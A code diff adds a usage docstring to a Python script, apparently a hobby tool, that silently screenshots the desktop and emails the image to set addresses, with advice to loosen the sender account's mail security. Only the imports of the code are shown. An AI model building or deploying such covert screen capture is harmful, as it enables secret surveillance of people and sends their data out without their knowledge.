@@ -1,3 +1,15 @@
+'''    WORKING OF CODE:->
+it captures a picture of your desktop(screenshot) without showing you and mail that to provided mail addresses
+please make sure to allow less secure app option in sender's mail id otherwise it won't work.
+index.txt contains the message of mail id,as well as it takes subject as input
+firstly desktop.jpeg is a random pic so don't worry about that it'll replace during execution of code.
+try to import all modules used otherwise it won't work.
+This code is designed to be run on windows,may be not compatable with ios or linux.
+
+Note :-> please don't run code on other people's devices without their permissions.
+
+
+'''
 try:
     from PIL import ImageGrab as ig
     import smtplib
